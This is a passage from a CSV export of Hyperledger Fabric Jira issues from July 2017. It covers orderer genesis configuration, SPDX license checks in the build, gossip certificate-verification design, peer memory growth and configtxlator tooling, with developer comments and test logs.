Moving this back to you just for now. Once we meet up tomorrow we can move to the right owner.;;;","25/Jul/17 3:12 PM;C0rWin;[~Clayton Sims] will make sure to get it right priority, meanwhile it looks like there is misconfiguration issue, will test delivery service fail-over test regardless of this issue, waiting for confirmation about setup and configuration from [~muralisr].;;;","25/Jul/17 11:51 PM;muralisr;Worked with [~jkirke] to understand the config better. It does appear [~jyellick] comment is in play here

{code:java}
I also see in the orderer.yaml that the provisional genesis method is specified. This should never be used in a production environment, as it causes the genesis block to be dynamically generated (which again, will usually be different at each invocation).
{code}

[~jkirke] lets test with the recommended configuration approach (using a common orderer config file, making sure bootstrapping is done once etc) and test to make sure system behaves as expected (or recreate the problem) and go from there please ?;;;","06/Aug/17 12:52 AM;Clayton Sims;[~jkirke]  can we close this now?;;;","30/Aug/17 12:47 PM;muralisr;[~jkirke] can we close this now ?;;;","08/Sep/17 2:31 AM;denyeart;Based on prior comments, switching to medium until we here back from reporter.;;;","08/Sep/17 3:09 AM;kchristidis;(Pinged Jason and asked him to update this.);;;","08/Sep/17 3:11 AM;jkirke;This issue can be closed. It is no longer occurring with current environment.;;;",,,,,,,,,,,,,,,
create a separate test repo for non-UT/BDD tests,FAB-5430,19430,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,scottz,ChristopherFerris,ChristopherFerris,23/Jul/17 3:57 AM,21/Jul/18 3:48 AM,28/Oct/23 3:00 AM,08/Aug/17 4:44 AM,v1.0.0,,,,,fabric-quality,,,,,,5,,,,,,,"see thread in RC starting here [https://chat.hyperledger.org/channel/fabric-pr-review?msg=Zx8zqvFtvn5GTyrSe]

[https://gerrit.hyperledger.org/r/#/c/11993/]

 ",,ChristopherFerris,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5546,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy9fr:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,ChristopherFerris,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,true,"24/Jul/17 11:11 PM;ChristopherFerris;counting mine, this has sufficient votes to proceed;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"""make"" fails because not all licenses are using SPDX",FAB-5431,19431,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,lehors,lehors,lehors,23/Jul/17 5:45 AM,21/Jul/18 3:49 AM,28/Oct/23 3:00 AM,23/Nov/17 10:06 PM,v1.0.0,,,v1.1.0,,fabric-build,,,,,,0,,,,,,," 

We're not at the point of enforcing SPDX everywhere so running ""make"" shouldn't fail just because of that.
{code:java}
$ make
...
Checking committed files for SPDX-License-Identifier headers ...
The following files are missing SPDX-License-Identifier headers:
bccsp/aesopts.go
...
test/tools/PTE/userInputs/samplecc-chan2-longrun-i.json
test/tools/PTE/userInputs/samplecc-chan2-longrun-i-TLS.json
Please replace the Apache license header comment text with:
SPDX-License-Identifier: Apache-2.0
Makefile:111: recipe for target 'license' failed
make: *** [license] Error 1
$ {code}
 The simple fix is to allow the build to continue in case of such an error:
{code:java}
$ make
...
Checking committed files for SPDX-License-Identifier headers ...
The following files are missing SPDX-License-Identifier headers:
bccsp/aesopts.go
...
test/tools/PTE/userInputs/samplecc-chan2-longrun-i.json
test/tools/PTE/userInputs/samplecc-chan2-longrun-i-TLS.json
Please replace the Apache license header comment text with:
SPDX-License-Identifier: Apache-2.0
Makefile:111: recipe for target 'license' failed
make: [license] Error 1 (ignored)
Checking changed go files for spelling errors ...
...
{code}
 

 ",,lehors,troyronda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy9fz:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,lehors,troyronda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"14/Sep/17 1:48 AM;troyronda;FYI: Here is the modified check license script in the Go SDK ... as not having any license header in a merge could be annoying to cleanup after the fact.

https://github.com/hyperledger/fabric-sdk-go/blob/master/test/scripts/check_license.sh;;;","14/Sep/17 1:49 AM;troyronda;([~ChristopherFerris] ^^^);;;","14/Sep/17 2:38 AM;lehors;[~troyronda], I've not been very successful pushing changes to this script in the past so I decided to try and attack this from another angle.  !https://jira.hyperledger.org/images/icons/emoticons/wink.png! But I think the approach you have in the Go SDK is good and I'd be happy with that.

Many of the fabric files didn't have any license and Chris is the one who fixed most of that so he knows quite well what a pain that is to fix.

I'll update my CR to adopt your approach.

Thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Move gossip policy checks from the critical path,FAB-5433,19433,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,23/Jul/17 5:14 PM,21/Jul/18 3:50 AM,28/Oct/23 3:00 AM,12/Aug/17 10:39 PM,v1.0.0,,,v1.1.0,,fabric-gossip,,,,,,0,,,,,,,"In gossip, when a message that contains a block is sent to a peer (or a peer requests a block) - we consult the [MessageCryptoService|https://github.com/hyperledger/fabric/blob/release/gossip/api/crypto.go#L28-L60] and ask it- is the given peer (that is considered to receive the block from us) among the [channel readers|https://github.com/hyperledger/fabric/blob/release/peer/gossip/mcs.go#L246]. 

The problem is that this operation involves verifying ECDSA signatures and it is in the critical path of the dissemination.
From tests I've run, we waste a couple of tens of milliseconds in small networks, and the computation is linear in the number of peers in the channel.

The peers that their certificate is checked, are taken from the [in-memory cache of the StateInfo messages|https://github.com/hyperledger/fabric/blob/release/gossip/gossip/channel/channel.go#L333-L344]. 

I propose we refactor this into the following flow that would offload the certificate verification to a step that is not in the critical path, and would also reduce the total number of certificate verifications to a minimum.

The proposed flow is the following:
* When a peer receives a StateInfo message and it is put into the channel module, the peer consults the MessageCryptoService whether the peer that signed the StateInfo message is among the channel readers.
** If not - the message is discarded.
* The StateInfo message is put into the in-memory cache as usual
* When the peer receives a block is is requested to send a block - it just checks whether the peer has a StateInfo message in the in-memory cache. If it does - it means the peer is a channel reader and can be given the block.
* When a config update comes, the [ConfigureChannel|https://github.com/hyperledger/fabric/blob/release/gossip/gossip/channel/channel.go#L361-L381] is called as usual, but this time - the method does over all the StateInfo messages in the cache, and checks if the peer that signed a given StateInfo message is a channel reader.
** If it is not - the message is deleted from the cache. 

[~C0rWin] 
[~gennadyl] 
opinions?",,angelo.decaro,C0rWin,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy9gf:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,angelo.decaro,C0rWin,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"23/Jul/17 7:05 PM;C0rWin;Sounds reasonable, need to keep in mind to clean up this cache also after certificate expiration.;;;","23/Jul/17 8:16 PM;yacovm;{quote}Sounds reasonable, need to keep in mind to clean up this cache also after certificate expiration.{quote}

That's what I thought too but when I looked at the code I think there isn't a need:
The method of *EligibleForChannel*'s signature is:
{code}
EligibleForChannel(member discovery.NetworkMember) bool
{code}
I can just make the new implementation call:  
{code}identity := gc.GetIdentityByPKIID(member.PKIid){code}
[which does|https://github.com/hyperledger/fabric/blob/release/gossip/gossip/chanstate.go#L163]:
{code}
	identity, err := ga.idMapper.Get(pkiID)
	if err != nil {
		return nil
	}
	return identity
{code}

Now, recall that when the certificates of the peers are checked for expiration, [SuspectPeers|https://github.com/hyperledger/fabric/blob/release/gossip/gossip/gossip_impl.go#L205] is called which calls [listRevokedPeers|https://github.com/hyperledger/fabric/blob/release/gossip/gossip/certstore.go#L146] which calls [idMapper.ListInvalidIdentities|https://github.com/hyperledger/fabric/blob/release/gossip/identity/identity.go#L146] which [deletes the identities|https://github.com/hyperledger/fabric/blob/release/gossip/identity/identity.go#L153-L154] from the identity mapper.
As a result - when the identities expire, they will not be found by *EligibleForChannel*. ;;;","24/Jul/17 5:37 PM;yacovm;https://gerrit.hyperledger.org/r/#/c/11851/;;;","03/Aug/17 1:58 PM;angelo.decaro;[~yacovm], I think it is important to clarify that what you suggest might work under the assumptions that MSP identities never expire but can only be revoked as we currently assume, Revoking an MSP identity requires a reconfiguration.

Still, there is something that bothers me. We need to be sure that this authorisation that is granted at the parsing of the StateInfo message is not used in malicious ways. [~elli-androulaki][~ales], what's your take on this?
Btw, is the state info message replayable? ;;;","03/Aug/17 5:50 PM;yacovm;{quote}I think it is important to clarify that what you suggest might work under the assumptions that MSP identities never expire{quote}

It looks like it but that's not the case. 
See my answer to Artem and the change set- there is a goroutine that periodically (once a day) goes through all identities and validates them. 
When an identity is invalidated it is deleted from the mapping between PKI-ID and identities in the identity mapper.
When *EligibleForChannel* is called - it checks that the PKI-ID of the stateInfo message exists in the mapping, thus - expired certificates won't be returned and we are safe.

{quote}Still, there is something that bothers me. We need to be sure that this authorisation that is granted at the parsing of the StateInfo message is not used in malicious ways{quote}
I don't understand what you mean, care to elaborate? 
I understand that *VerifyByChannel* calls the policy.Evaluate which underneath - verifies the identity, isn't that so?

{quote}Btw, is the state info message replayable? {quote}
It is bounded to the PKI-ID so I don't see how that helps someone. 
;;;","14/Aug/17 9:43 AM;angelo.decaro;[~yacovm], thanks for the explanation. Once a day might be too long. In the future, would it be possible to check for the expiration every time that there is a hit in the cache?;;;","14/Aug/17 3:51 PM;yacovm;FAB-5752 should tackle the expiration issue ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Improve documentation,FAB-5435,19435,,Story,Closed,FAB,Fabric,software,denyeart,,,Low,Done,kchristidis,kchristidis,kchristidis,24/Jul/17 7:28 AM,21/Jul/18 3:50 AM,28/Oct/23 3:00 AM,25/Jul/17 11:52 AM,v1.0.0,,,WON'T FIX,,fabric-docs,,,,,,0,,,,,,,"Creating this story to fix the minor issues I bump into when going through the documentation.

This will take me forever to finish, but that's OK.",,kchristidis,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy9gv:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,kchristidis,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix Getting Started,FAB-5436,19436,19435,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Low,Done,kchristidis,kchristidis,kchristidis,24/Jul/17 7:29 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,25/Jul/17 11:53 AM,v1.0.0,,,WON'T FIX,,fabric-docs,,,,,,0,,,,,,,,,kchristidis,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9h3:",,,,,,,,,,,,,,,,,,,,,,,kchristidis,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Fabric is behaving in a funny way - transaction times out, context cancelled",FAB-5438,19438,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,,rmohta,rmohta,24/Jul/17 1:25 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,08/Aug/17 1:55 PM,v1.0.0-alpha2,,,,,fabric-peer,,,,,,0,,,,,,,"Using image: x86_64-1.0.0-alpha2

Not sure how to break this behavior in multiple bug. And I'm not sure if this is fixed in any future release. Couldn't see anything mentioned in Release Notes

*Issue 1:* Chaincode container restarts automatically. 
*Issue 2:* Post restart, Fabric enters a limbo state where either of these two happen
* When we try to create a new asset via Nodejs SDK - transaction times out during endorsement stage
* If endorsement is successful, then I can see a success message from peer. But then, orderer prints error message as - 

{noformat}
transport: http2Server.HandleStreams failed to receive the preface from client: EOF
{noformat}

Consequence of this: 
* Cannot perform stable transaction on the network
* post multiple attempts (without restarting) the network - if successful, block is not pushed to all peers

Will attach logs. 
",,rmohta,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Jul/17 1:27 PM;rmohta;container_restarted_automatically.log.17July2017;https://jira.hyperledger.org/secure/attachment/11753/container_restarted_automatically.log.17July2017","24/Jul/17 1:26 PM;rmohta;logs-nodejssdk-errormessage.txt;https://jira.hyperledger.org/secure/attachment/11750/logs-nodejssdk-errormessage.txt","24/Jul/17 1:26 PM;rmohta;logs-orderer.txt;https://jira.hyperledger.org/secure/attachment/11751/logs-orderer.txt","24/Jul/17 1:26 PM;rmohta;logs-org1-peer0.txt;https://jira.hyperledger.org/secure/attachment/11752/logs-org1-peer0.txt",,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9hj:",,,,,,,,,,,,,,,,,,,,,,,rmohta,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Aug/17 1:55 PM;rmohta;After upgrading to 1.0, everything seems to work normally. Will open a new ticket, if this re-occurs.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Dummy task for test jobbuilder for node-sdk,FAB-5439,19439,,Task,Closed,FAB,Fabric,software,denyeart,,,Lowest,Won't Do,,davidkhala,davidkhala,24/Jul/17 3:44 PM,30/Jul/19 11:59 AM,28/Oct/23 3:00 AM,30/Jul/19 11:59 AM,v1.0.0,,,WON'T FIX,,,,,,,,0,v1.1,,,,,," 

 ",,davidkhala,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9hr:",,,,,,,,,,,,,,,,,,,,,,,davidkhala,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/May/18 2:03 PM;davidkhala;[https://gerrit.hyperledger.org/r/#/c/20231/]
{code:java}
02:55:41 not ok 1444 should have duration roughly equals 3000 02:55:41 --- 02:55:41 operator: equal 02:55:41 expected: 3 02:55:41 actual: 1 02:55:41 at: timeOutTest (/w/workspace/fabric-sdk-node8-verify-x86_64/gopath/src/github.com/hyperledger/fabric-sdk-node/test/integration/fabric-ca-services-tests.js:441:7) 02:55:41 stack: |- 02:55:41 Error: should have duration roughly equals 3000 02:55:41 at Test.assert [as _assert] (/w/workspace/fabric-sdk-node8-verify-x86_64/gopath/src/github.com/hyperledger/fabric-sdk-node/node_modules/tape/lib/test.js:225:54) 02:55:41 at Test.bound [as _assert] (/w/workspace/fabric-sdk-node8-verify-x86_64/gopath/src/github.com/hyperledger/fabric-sdk-node/node_modules/tape/lib/test.js:77:32) 02:55:41 at Test.equal.Test.equals.Test.isEqual.Test.is.Test.strictEqual.Test.strictEquals (/w/workspace/fabric-sdk-node8-verify-x86_64/gopath/src/github.com/hyperledger/fabric-sdk-node/node_modules/tape/lib/test.js:388:10) 02:55:41 at Test.bound [as equal] (/w/workspace/fabric-sdk-node8-verify-x86_64/gopath/src/github.com/hyperledger/fabric-sdk-node/node_modules/tape/lib/test.js:77:32) 02:55:41 at timeOutTest (/w/workspace/fabric-sdk-node8-verify-x86_64/gopath/src/github.com/hyperledger/fabric-sdk-node/test/integration/fabric-ca-services-tests.js:441:7) 02:55:41 at <anonymous> 02:55:41 at process._tickDomainCallback (internal/process/next_tick.js:228:7) 02:55:41 ... 02:55:41 not ok 1445 should be equal 02:55:41 --- 02:55:41 operator: equal 02:55:41 expected: |- 02:55:41 'Calling /aMethod endpoint failed, CONNECTION Timeout' 02:55:41 actual: |- 02:55:41 'Calling /aMethod endpoint failed with error [Error: connect ENETUNREACH 10.255.255.1:3000]' 02:55:41 at: timeOutTest (/w/workspace/fabric-sdk-node8-verify-x86_64/gopath/src/github.com/hyperledger/fabric-sdk-node/test/integration/fabric-ca-services-tests.js:442:5) 02:55:41 stack: |- 02:55:41 Error: should be equal 02:55:41 at Test.assert [as _assert] (/w/workspace/fabric-sdk-node8-verify-x86_64/gopath/src/github.com/hyperledger/fabric-sdk-node/node_modules/tape/lib/test.js:225:54) 02:55:41 at Test.bound [as _assert] (/w/workspace/fabric-sdk-node8-verify-x86_64/gopath/src/github.com/hyperledger/fabric-sdk-node/node_modules/tape/lib/test.js:77:32) 02:55:41 at Test.equal.Test.equals.Test.isEqual.Test.is.Test.strictEqual.Test.strictEquals (/w/workspace/fabric-sdk-node8-verify-x86_64/gopath/src/github.com/hyperledger/fabric-sdk-node/node_modules/tape/lib/test.js:388:10) 02:55:41 at Test.bound [as equal] (/w/workspace/fabric-sdk-node8-verify-x86_64/gopath/src/github.com/hyperledger/fabric-sdk-node/node_modules/tape/lib/test.js:77:32) 02:55:41 at timeOutTest (/w/workspace/fabric-sdk-node8-verify-x86_64/gopath/src/github.com/hyperledger/fabric-sdk-node/test/integration/fabric-ca-services-tests.js:442:5) 02:55:41 at <anonymous> 02:55:41 at process._tickDomainCallback (internal/process/next_tick.js:228:7)
{code};;;","30/Jul/19 11:59 AM;mastersingh24;No activity in a year or more;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Allow peer CLI to sign configtx without submitting,FAB-5441,19445,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,24/Jul/17 11:05 PM,21/Jul/18 3:49 AM,28/Oct/23 3:00 AM,31/Jul/17 5:56 AM,,,,v1.1.0,,fabric-tools,,,,,,0,,,,,,,"The reconfiguration flow requires multiple signatures for most configuration updates.  However, the only way to sign those updates outside of the SDK today is the peer CLI.

The peer CLI needs to support this workflow in some manner.  The most direct is probably to simply sign but not submit, and instead write to the filesystem.  In this way, the peer CLI can be invoked multiple times with different crypto identities to form a collection of signatures over the configtx.",,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy9if:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"25/Jul/17 1:25 AM;jyellick;https://gerrit.hyperledger.org/r/#/c/11875/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Have configtxlator return default values,FAB-5443,19447,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,25/Jul/17 1:49 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,28/Jul/17 5:44 AM,,,,v1.1.0,,fabric-tools,,,,,,0,configtxlator,,,,,,"The configtxlator tool currently does not emit default field values when decoding.

This decision was originally made because printing these fields make the output much more verbose.

However, there has been feedback from multiple users that this is confusing.  So, this field should be toggled.",,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9iv:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"25/Jul/17 1:56 AM;jyellick;https://gerrit.hyperledger.org/r/#/c/11877/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Consolidate remaining filters to msgprocessor dir,FAB-5445,19450,18070,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,25/Jul/17 4:08 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,05/Aug/17 8:47 PM,,,,,,fabric-orderer,,,,,,0,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9jb:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Orderer metadata test broken for dev builds,FAB-5446,19455,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,25/Jul/17 5:50 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,26/Jul/17 10:06 PM,,,,v1.0.1,v1.1.0,fabric-orderer,,,,,,0,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9jr:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"25/Jul/17 5:53 AM;jyellick;In review via https://gerrit.hyperledger.org/r/11887;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Need a way to control Peer memory consumption,FAB-5448,19460,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,ptippett,ptippett,25/Jul/17 9:34 AM,23/Jan/20 6:56 AM,28/Oct/23 3:00 AM,23/Jan/20 6:56 AM,,,,,,,,,,,,0,HSBN,stale-item,,,,,"When combination of Endorsement, Validation, and Commit processing consistently surpasses a peer's ability to consume , peer memory consumption grows, potentially leading to an out of memory condition. How do we best preserve Peer, minimize pain to the client?

 

I've attached a spreadsheet showing the result of the run.  I've asked the team to confirm what happens when the peer consumes all available memory since if it keeps running that's not as big of a problem as falling over or getting OOM killed.",,ptippett,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"25/Jul/17 9:32 AM;ptippett;Peer.Active.mem.consumption.xlsx;https://jira.hyperledger.org/secure/attachment/11765/Peer.Active.mem.consumption.xlsx",,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy9kf:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,ptippett,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/20 6:56 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix README,FAB-5449,19461,19435,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Low,Done,kchristidis,kchristidis,kchristidis,25/Jul/17 10:10 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,25/Jul/17 11:53 AM,v1.0.0,,,WON'T FIX,,fabric-docs,,,,,,0,,,,,,,,,kchristidis,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9kn:",,,,,,,,,,,,,,,,,,,,,,,kchristidis,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Orderer should log genesis block hash,FAB-5450,19462,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,guoger,jyellick,jyellick,25/Jul/17 11:29 AM,21/Jul/18 3:50 AM,28/Oct/23 3:00 AM,09/Aug/17 9:26 PM,,,,v1.1.1,,fabric-orderer,,,,,,0,serviceability,,,,,,"Although it is explicitly not supported, starting two different orderer processes with two different genesis blocks (even if generated from the same {{configtx.yaml}} will result in a divergent blockchain at startup.

